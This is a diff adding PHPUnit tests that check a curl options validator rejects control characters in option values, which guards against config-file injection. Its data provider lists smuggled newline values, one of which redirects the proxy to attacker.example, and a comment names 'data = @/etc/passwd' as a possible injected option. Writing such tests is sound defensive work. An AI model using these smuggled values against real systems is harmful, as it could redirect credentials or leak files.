@@ -47,6 +47,54 @@ class CurlOptionsTest extends TestCase
         }
     }
 
+    /**
+     * A control character in an option value is an injection, not a typo.
+     *
+     * The executable engine renders `proxy`/`proxy-user` into curl's config
+     * file, whose format is line-oriented: a newline ends that option and curl
+     * reads the rest of the value as ANOTHER option. A proxy string taken from
+     * a rotating-proxy list or a tenant's settings could otherwise add `proxy`
+     * (redirecting the request, Authorization header and all, to an endpoint
+     * the attacker picked), `insecure`, or `data = @/etc/passwd`.
+     */
+    #[DataProvider('controlCharacterValues')]
+    public function testAssertAllowedRejectsControlCharactersInStringValues(string $key, string $value): void
+    {
+        $this->expectException(InvalidArgumentException::class);
+        $this->expectExceptionMessage('may not contain CR, LF, or NUL');
+
+        CurlOptions::assertAllowed([$key => $value]);
+    }
+
+    /**
+     * @return array<string, array{0: string, 1: string}>
+     */
+    public static function controlCharacterValues(): array
+    {
+        return [
+            'proxy-user smuggling a proxy' => ['proxy-user', "user:pass\nproxy = http://attacker.example\n# "],
+            'proxy smuggling insecure' => ['proxy', "http://127.0.0.1:8080\ninsecure"],
+            'carriage return' => ['proxy', "http://127.0.0.1:8080\rinsecure"],
+            'bare line feed' => ['noproxy', "example.com\nfoo"],
+            'referer' => ['referer', "http://example.com\nX"],
+            'cacert path' => ['cacert', "/etc/ssl/certs/ca.pem\nfoo"],
+            'NUL byte' => ['proxy-user', "user:pass\0truncated"],
+        ];
+    }
+
+    /**
+     * The guard must not cost legitimate credentials: quotes and backslashes are
+     * escaped for curl's config parser, not rejected.
+     */
+    public function testAssertAllowedAcceptsAwkwardButValidCredentials(): void
+    {
+        CurlOptions::assertAllowed([
+            'proxy' => 'socks5://127.0.0.1:1080',
+            'proxy-user' => 'user:pa"ss\\word with spaces!',
+        ]);
+        $this->addToAssertionCount(1);
+    }
+
     public function testTypesAndOptionIds(): void
     {
         $this->assertSame(CurlOptions::TYPE_STRING, CurlOptions::type('proxy'));
